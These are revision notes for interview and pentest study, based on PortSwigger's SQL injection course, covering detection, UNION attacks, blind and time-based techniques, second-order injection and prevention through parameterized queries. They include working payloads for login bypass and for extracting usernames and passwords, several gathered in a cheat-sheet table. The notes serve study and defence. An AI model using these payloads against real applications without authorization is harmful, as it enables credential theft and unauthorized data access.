# PortSwigger SQL Injection --- Short Revision Notes

> **Purpose:** Interview + entry-level pentesting revision notes based
> on the PortSwigger Web Security Academy SQL Injection module.\
> **Scope:** Core concepts, detection, common exploitation techniques,
> UNION attacks, blind SQLi, database enumeration, contexts, and
> prevention.

------------------------------------------------------------------------

## 1. What is SQL Injection (SQLi)?

-   **SQL Injection** is a vulnerability where attacker-controlled input
    changes the structure or logic of a SQL query.
-   It occurs when untrusted input is incorporated into SQL without safe
    parameterization.
-   Possible impact:
    -   Read unauthorized data.
    -   Bypass authentication/authorization logic.
    -   Modify or delete database data.
    -   In some cases, compromise backend infrastructure or cause DoS.

### Root cause

``` text
User input → unsafe string concatenation → SQL query
```

Example vulnerable code:

``` text
"SELECT * FROM users WHERE username = '" + input + "'"
```

The attacker can make `input` become part of the SQL syntax instead of
remaining data.

------------------------------------------------------------------------

## 2. Impact of SQL Injection

-   Confidentiality:
    -   Usernames, passwords, personal information, payment data.
-   Integrity:
    -   Modify or delete records.
-   Authentication bypass:
    -   Change the logic of login queries.
-   Potential deeper compromise:
    -   Depending on DBMS configuration and application privileges.
-   Business impact:
    -   Data breach, regulatory consequences, reputation damage.

------------------------------------------------------------------------

## 3. Detecting SQL Injection

A systematic manual approach:

-   Test every controllable input.
-   Start with syntax-breaking characters such as `'`.
-   Compare normal and manipulated responses.
-   Test boolean conditions.
-   Test time-based behavior where appropriate.
-   Test OAST/out-of-band behavior where appropriate.
-   Burp Suite Scanner can automate much of the detection.

### Basic detection payloads

  -----------------------------------------------------------------------
  Payload                             Explanation
  ----------------------------------- -----------------------------------
  `'`                                 Tests whether a quote breaks the
                                      surrounding SQL syntax.

  `' OR 1=1--`                        Tests whether a true boolean
                                      condition changes the response.

  `' OR 1=2--`                        False-condition counterpart used
                                      for comparison.

  `' AND 1=1--`                       True condition; useful when `AND`
                                      fits the original query.

  `' AND 1=2--`                       False condition; compare response
                                      with the true condition.
  -----------------------------------------------------------------------

**Important:** Payload syntax depends on the original query context and
DBMS.

------------------------------------------------------------------------

## 4. SQL Injection in Different Parts of a Query

SQLi is not limited to a `WHERE` clause.

Common locations:

-   `SELECT ... WHERE ...`
-   `UPDATE` values or `WHERE` clause.
-   `INSERT` values.
-   `SELECT` table/column identifiers.
-   `ORDER BY` clause.
-   JSON/XML parameters that are later used in SQL.

### Key idea

> Always identify **where your input is inserted into the SQL
> statement** before choosing a payload.

------------------------------------------------------------------------

# 5. Retrieving Hidden Data

Suppose the application executes:

``` sql
SELECT * FROM products
WHERE category = 'Gifts' AND released = 1
```

The attacker may attempt to alter the logic.

### Payload table

  -----------------------------------------------------------------------
  Payload                             Explanation
  ----------------------------------- -----------------------------------
  `'--`                               Closes the string and comments out
                                      the remainder of the query.

  `' OR 1=1--`                        Adds an always-true condition,
                                      potentially returning all rows.

  `' OR '1'='1'--`                    String-based version of an
                                      always-true condition.
  -----------------------------------------------------------------------

### Important

`--` starts a SQL comment in many DBMSs. MySQL commonly requires
whitespace after `--`; `#` can also be used for comments in MySQL.

**Caution:** `OR 1=1` can be dangerous if the same input reaches an
`UPDATE` or `DELETE` query.

------------------------------------------------------------------------

# 6. Subverting Application Logic

A common example is login:

``` sql
SELECT * FROM users
WHERE username = 'wiener'
AND password = 'bluecheese'
```

If the username input is:

``` text
administrator'--
```

the resulting query can become conceptually:

``` sql
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = ''
```

The password condition is commented out.

### Payload table

  -----------------------------------------------------------------------
  Payload                             Explanation
  ----------------------------------- -----------------------------------
  `administrator'--`                  Attempts to terminate the username
                                      string and comment out the password
                                      check.

  `' OR 1=1--`                        Attempts to make the authentication
                                      condition always true.
  -----------------------------------------------------------------------

------------------------------------------------------------------------

# 7. Retrieving Data From Other Tables --- UNION SQLi

`UNION` combines the results of another `SELECT` query with the original
query.

Example:

``` sql
SELECT name, description
FROM products
WHERE category = 'Gifts'
```

Possible injection:

``` sql
' UNION SELECT username, password FROM users--
```

### UNION requirements

The injected query normally needs:

1.  The **same number of columns** as the original query.
2.  Compatible **data types** in corresponding columns.

------------------------------------------------------------------------

# 8. UNION Attack --- Step 1: Determine Number of Columns

### Method A --- ORDER BY

Try increasing column indexes:

  -----------------------------------------------------------------------
  Payload                             Purpose
  ----------------------------------- -----------------------------------
  `' ORDER BY 1--`                    Tests whether column 1 exists.

  `' ORDER BY 2--`                    Tests whether column 2 exists.

  `' ORDER BY 3--`                    Tests whether column 3 exists.

  Continue...                         Stop when the response indicates an
                                      invalid column position.
  -----------------------------------------------------------------------

If `ORDER BY 3` causes an error but `ORDER BY 2` works, the query likely
returns **2 columns**.

### Method B --- UNION SELECT with NULL

  Payload                             Purpose
  ----------------------------------- ----------------------
  `' UNION SELECT NULL--`             Tests for 1 column.
  `' UNION SELECT NULL,NULL--`        Tests for 2 columns.
  `' UNION SELECT NULL,NULL,NULL--`   Tests for 3 columns.

`NULL` is useful because it is compatible with many data types.

------------------------------------------------------------------------

# 9. UNION Attack --- Step 2: Find a Text-Compatible Column

Suppose the original query has 4 columns.

Test a string in each position:

``` sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Payload table

  ---------------------------------------------------------------------------
  Payload                                 Meaning
  --------------------------------------- -----------------------------------
  `' UNION SELECT 'a',NULL,NULL,NULL--`   Tests column 1 for text
                                          compatibility.

  `' UNION SELECT NULL,'a',NULL,NULL--`   Tests column 2.

  `' UNION SELECT NULL,NULL,'a',NULL--`   Tests column 3.

  `' UNION SELECT NULL,NULL,NULL,'a'--`   Tests column 4.
  ---------------------------------------------------------------------------

The column where `a` appears successfully is useful for displaying
extracted string data.

------------------------------------------------------------------------

# 10. UNION Attack --- Step 3: Retrieve Interesting Data

Once you know:

-   Number of columns.
-   Which column accepts text.
-   Relevant table/column names.

You can construct a UNION query.

Example:

``` sql
' UNION SELECT username,password FROM users--
```

If the original query has more columns, use `NULL` for unused positions.

Example:

``` sql
' UNION SELECT NULL,username,password,NULL FROM users--
```

------------------------------------------------------------------------

# 11. Retrieving Multiple Values in a Single Column

Sometimes only one returned column can display text.

Solution: **concatenate multiple database values into one string.**

Example concept:

``` sql
username || '~' || password
```

Result:

``` text
administrator~password123
wiener~peter
```

### Payload

``` sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

### DBMS-specific concatenation

  DBMS                   Example                 Explanation
  ---------------------- ----------------------- ----------------------------
  Oracle                 `'foo'||'bar'`          `||` concatenates strings.
  PostgreSQL             `'foo'||'bar'`          `||` concatenates strings.
  Microsoft SQL Server   `'foo'+'bar'`           `+` concatenates strings.
  MySQL                  `CONCAT('foo','bar')`   `CONCAT()` joins strings.

------------------------------------------------------------------------

# 12. Examining the Database

After confirming SQLi, identifying the DBMS can make exploitation easier
because syntax differs between platforms.

Useful information:

-   DBMS type.
-   DBMS version.
-   Database/table names.
-   Column names.
-   Data types.
-   Database-specific functions.

### Version-identification examples

  ---------------------------------------------------------------------------
  DBMS                    Example                     Explanation
  ----------------------- --------------------------- -----------------------
  Oracle                  `SELECT * FROM v$version`   Queries Oracle version
                                                      information.

  MySQL                   `SELECT @@version`          Returns MySQL version
                                                      information.

  SQL Server              `SELECT @@version`          Returns SQL Server
                                                      version information.

  PostgreSQL              `SELECT version()`          Returns PostgreSQL
                                                      version information.
  ---------------------------------------------------------------------------

------------------------------------------------------------------------

# 13. Listing Database Contents

A common metadata source is:

``` sql
SELECT * FROM information_schema.tables
```

It can help identify tables in DBMSs that expose `information_schema`.

Typical workflow:

``` text
SQLi confirmed
     ↓
Identify DBMS
     ↓
Enumerate tables
     ↓
Enumerate columns
     ↓
Identify interesting data
     ↓
Retrieve data
```

------------------------------------------------------------------------

# 14. Blind SQL Injection

### Definition

Blind SQLi occurs when:

-   The application is vulnerable to SQLi.
-   But the HTTP response does **not** directly display the query
    results.
-   Database errors may also be hidden.

Therefore, the tester must infer information indirectly.

### Main techniques

1.  Conditional responses.
2.  Conditional errors.
3.  Time delays.
4.  Out-of-band (OAST) interactions.

------------------------------------------------------------------------

# 15. Blind SQLi --- Conditional Responses

The application may behave differently when an injected condition is
true versus false.

Example:

``` text
xyz' AND '1'='1
xyz' AND '1'='2
```

### Payload table

  -----------------------------------------------------------------------
  Payload                             Explanation
  ----------------------------------- -----------------------------------
  `xyz' AND '1'='1`                   True condition. Look for the
                                      application's "true" response.

  `xyz' AND '1'='2`                   False condition. Compare the
                                      response.
  -----------------------------------------------------------------------

If the responses differ, you have a **boolean oracle**.

------------------------------------------------------------------------

# 16. Blind SQLi --- Extracting Data Character by Character

If a condition can be tested, data can be inferred one character at a
time.

Example concept:

``` sql
SUBSTRING(
  (SELECT Password FROM Users WHERE Username='Administrator'),
  1,
  1
) > 'm'
```

Possible process:

``` text
Is first character > 'm'?
        ↓
Is first character > 't'?
        ↓
Is first character = 's'?
        ↓
Move to character 2
        ↓
Repeat
```

### Example payloads

  ------------------------------------------------------------------------------------------------------------------------------
  Payload                                                                                    Explanation
  ------------------------------------------------------------------------------------------ -----------------------------------
  `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'m`   Tests whether character 1 is
                                                                                             alphabetically greater than `m`.

  `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s`   Tests whether character 1 equals
                                                                                             `s`.
  ------------------------------------------------------------------------------------------------------------------------------

`SUBSTRING` syntax varies by DBMS; some use `SUBSTR`.

------------------------------------------------------------------------

# 17. Error-Based SQL Injection

Error-based SQLi uses database errors as an information channel.

Two important cases:

-   Trigger an error conditionally.
-   Cause an error message to contain/expose query data.

### Concept

``` text
Condition false → normal response
Condition true  → database error
```

The response difference reveals information.

------------------------------------------------------------------------

# 18. Blind SQLi --- Conditional Errors

Useful when normal true/false conditions do not change the application's
response.

The attacker constructs a query that:

``` text
IF condition is TRUE → cause database error
IF condition is FALSE → do not cause error
```

The presence/absence of an error becomes the signal.

------------------------------------------------------------------------

# 19. Verbose Error Messages

Some DBMS errors can reveal information from an injected query.

Examples from the PortSwigger SQLi cheat sheet include DBMS-specific
error techniques.

### Concept

``` text
Injected query
     ↓
Database error
     ↓
Error message contains useful information
     ↓
Sensitive data inferred/extracted
```

Use DBMS-specific syntax rather than assuming one payload works
everywhere.

------------------------------------------------------------------------

# 20. Blind SQLi --- Time Delays

When there is no visible response difference and errors are hidden, an
attacker may use a conditional delay.

Concept:

``` text
IF condition TRUE  → database waits
IF condition FALSE → normal response
```

The tester compares response times.

### Conceptual payload

``` sql
IF(condition, SLEEP(5), 0)
```

Exact syntax depends on the DBMS.

### Payload table

  -------------------------------------------------------------------------
  DBMS                    Example technique         Explanation
  ----------------------- ------------------------- -----------------------
  MySQL                   `SLEEP(5)`                Delays execution for
                                                    approximately 5
                                                    seconds.

  PostgreSQL              `pg_sleep(5)`             Delays execution for
                                                    approximately 5
                                                    seconds.

  SQL Server              `WAITFOR DELAY '0:0:5'`   Delays execution.

  Oracle                  Database-specific delay   Syntax differs from
                          techniques                other DBMSs.
  -------------------------------------------------------------------------

Use time-based SQLi carefully because network latency can create false
positives.

------------------------------------------------------------------------

# 21. Out-of-Band (OAST) SQL Injection

OAST is useful when:

-   The application does not return query results.
-   Boolean differences are unavailable.
-   Errors are hidden.
-   Time-based techniques are unreliable.

The database/application is induced to make an external network
interaction, such as DNS.

### Concept

``` text
SQL injection
     ↓
Database performs external interaction
     ↓
Tester-controlled OAST server observes interaction
     ↓
Information is inferred or exfiltrated
```

Burp Collaborator is commonly used in PortSwigger labs for OAST testing.

------------------------------------------------------------------------

# 22. Second-Order SQL Injection

### First-order SQLi

The malicious input is immediately used in a vulnerable SQL query.

``` text
HTTP input → vulnerable SQL query → effect
```

### Second-order SQLi

The malicious input is first stored safely, then later retrieved and
used unsafely.

``` text
HTTP input
    ↓
Stored in database
    ↓
Later retrieved
    ↓
Used unsafely in another SQL query
    ↓
SQL injection
```

Also called **stored SQL injection**.

### Key interview point

> The initial storage operation may be safe; the vulnerability occurs
> later when the stored value is incorporated into SQL unsafely.

------------------------------------------------------------------------

# 23. SQL Injection in Different Contexts

SQLi can occur through:

-   URL/query parameters.
-   Form parameters.
-   Cookies.
-   HTTP headers.
-   JSON.
-   XML.
-   Other application-controlled inputs.

Example XML context:

``` xml
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```

The XML entity can be decoded before the value reaches the SQL
interpreter.

### Important

The payload must match the context:

``` text
String context
Numeric context
JSON context
XML context
ORDER BY / identifier context
```

------------------------------------------------------------------------

# 24. DBMS Differences

Do not assume every SQLi payload works on every database.

Differences commonly include:

-   String concatenation.
-   Comment syntax.
-   Stacked queries.
-   Functions.
-   Error behavior.
-   Metadata structures.
-   Time-delay functions.

### Quick reference

  -----------------------------------------------------------------------------
  Feature        Oracle         PostgreSQL      SQL Server      MySQL
  -------------- -------------- --------------- --------------- ---------------
  String concat  `||`           `||`            `+`             `CONCAT()`

  Comment        `--`           `--`            `--`            `#` / `--`

  Version        `v$version`    `version()`     `@@version`     `@@version`

  Substring      `SUBSTR()`     `SUBSTRING()`   `SUBSTRING()`   `SUBSTRING()`
  -----------------------------------------------------------------------------

------------------------------------------------------------------------

# 25. SQL Injection Prevention

## Primary defense: Parameterized Queries

Use:

-   Prepared statements.
-   Parameterized queries.
-   Safe database APIs.

### Vulnerable

``` text
"SELECT * FROM products WHERE category = '" + input + "'"
```

### Safer

``` text
PreparedStatement:
SELECT * FROM products WHERE category = ?
```

Then bind the user input as a parameter.

### Why this works

The database treats the supplied value as **data**, not as part of the
SQL statement structure.

------------------------------------------------------------------------

# 26. When Parameterization Is Not Enough

Parameterized queries cannot normally be used to represent SQL
identifiers such as:

-   Table names.
-   Column names.
-   `ORDER BY` identifiers.

For these cases:

-   Use a strict allowlist.
-   Map user-controlled choices to predefined SQL identifiers.
-   Avoid directly concatenating arbitrary input.

Example concept:

``` text
User input: "name"

Allowlist:
name  → ORDER BY name
price → ORDER BY price

Anything else → reject
```

------------------------------------------------------------------------

# 27. SQLi Payload Cheat Sheet

  -------------------------------------------------------------------------------------------------------
  Purpose                 Payload / Pattern                                       Explanation
  ----------------------- ------------------------------------------------------- -----------------------
  Break string            `'`                                                     Tests whether input is
                                                                                  inside a quoted SQL
                                                                                  string.

  Comment remainder       `'--`                                                   Terminates a string and
                                                                                  comments out following
                                                                                  SQL.

  True condition          `' OR 1=1--`                                            Tests an always-true
                                                                                  condition.

  False condition         `' OR 1=2--`                                            Provides a contrasting
                                                                                  false condition.

  Login bypass test       `administrator'--`                                      Attempts to remove a
                                                                                  password condition.

  Column count            `' ORDER BY 1--`                                        Tests whether column
                                                                                  index 1 exists.

  UNION count             `' UNION SELECT NULL,NULL--`                            Tests for a 2-column
                                                                                  result.

  Text column test        `' UNION SELECT 'a',NULL--`                             Tests whether column 1
                                                                                  accepts text.

  Retrieve two columns    `' UNION SELECT username,password FROM users--`         Attempts to display two
                                                                                  fields.

  Concatenate values      `' UNION SELECT username||'~'||password FROM users--`   Combines multiple
                                                                                  values into one output
                                                                                  column on DBMSs
                                                                                  supporting `||`.

  Table enumeration       `SELECT * FROM information_schema.tables`               Lists metadata tables
                                                                                  on supported DBMSs.

  Boolean blind           `' AND '1'='1`                                          True condition.

  Boolean blind           `' AND '1'='2`                                          False condition.

  Character extraction    `SUBSTRING((SELECT password ...),1,1)`                  Extracts one character
                                                                                  for inference.

  Time-based              `SLEEP(5)`                                              MySQL-style delay
                                                                                  function.

  Time-based              `pg_sleep(5)`                                           PostgreSQL delay
                                                                                  function.

  SQL Server delay        `WAITFOR DELAY '0:0:5'`                                 SQL Server delay
                                                                                  technique.
  -------------------------------------------------------------------------------------------------------

> **Note:** Payloads are DBMS- and query-context-dependent. Treat this
> table as a revision reference, not a universal copy-paste list.

------------------------------------------------------------------------

# 28. Pentester's SQLi Methodology

``` text
1. Find input points
        ↓
2. Test '
        ↓
3. Compare responses
        ↓
4. Determine injection context
        ↓
5. Identify DBMS if possible
        ↓
6. Determine whether SQLi is visible or blind
        ↓
7. If visible → UNION / error-based techniques
        ↓
8. If blind → boolean / error / time / OAST
        ↓
9. Enumerate database structure
        ↓
10. Retrieve only authorized proof-of-impact data
        ↓
11. Document evidence + remediation
```

------------------------------------------------------------------------

# 29. Interview Questions to Remember

### What causes SQL injection?

> SQL injection is primarily caused by incorporating untrusted user
> input into SQL statements without proper parameterization, allowing
> the input to alter the intended SQL syntax or logic.

### Why does `UNION` SQLi require the same number of columns?

> A UNION combines result sets, so the participating SELECT statements
> must return compatible result structures, including the same number of
> columns.

### Why use `NULL` when determining column count?

> `NULL` is compatible with many data types, so it reduces type-mismatch
> problems while testing the number of columns.

### What is blind SQL injection?

> Blind SQL injection occurs when the application is vulnerable to SQL
> injection but does not directly return the injected query's results or
> useful database errors. The tester therefore infers information
> through response differences, errors, delays, or out-of-band
> interactions.

### Difference between first-order and second-order SQLi?

> First-order SQLi is triggered immediately when input is incorporated
> into a vulnerable query. Second-order SQLi occurs when input is stored
> first and becomes dangerous later when the stored value is retrieved
> and used unsafely in another query.

### Best prevention for SQLi?

> Use parameterized queries/prepared statements and avoid constructing
> SQL by concatenating untrusted input.

------------------------------------------------------------------------

# 30. Entry-Level Pentester --- What You Should Be Comfortable With

### Must know

-   SQLi definition and root cause.
-   Impact.
-   Detecting SQLi manually.
-   Boolean true/false testing.
-   SQL comments.
-   Authentication bypass concept.
-   UNION SQLi.
-   Determining column count.
-   Identifying text-compatible columns.
-   Retrieving data.
-   String concatenation.
-   Blind SQLi concept.
-   Conditional-response blind SQLi.
-   Character-by-character extraction concept.
-   Error-based SQLi.
-   Time-based SQLi.
-   OAST concept.
-   Second-order SQLi.
-   Basic DBMS differences.
-   Parameterized queries/prepared statements.

### Practical Burp skills

-   Intercept requests.
-   Send requests to Repeater.
-   Modify parameters/cookies.
-   Compare responses.
-   Use Intruder for repetitive testing.
-   Identify useful response differences.
-   Keep evidence for the final report.

------------------------------------------------------------------------

# Quick Mental Model

``` text
                SQL INJECTION
                      |
       +--------------+--------------+
       |              |              |
   Visible         Blind         Second-order
       |              |              |
     UNION      Boolean/Error/       Stored
     Error      Time/OAST            input
       |
  +----+----+
  |         |
Columns   Data
  |         |
Count     Retrieve
  |
Text column
  |
UNION SELECT
```

------------------------------------------------------------------------

## Final Revision Rule

When testing SQLi, think:

> **Where does my input enter the query? → Can I change the query logic?
> → Can I observe the result? → Which technique matches that
> observation? → Which DBMS syntax applies? → How can the vulnerability
> be safely remediated?**
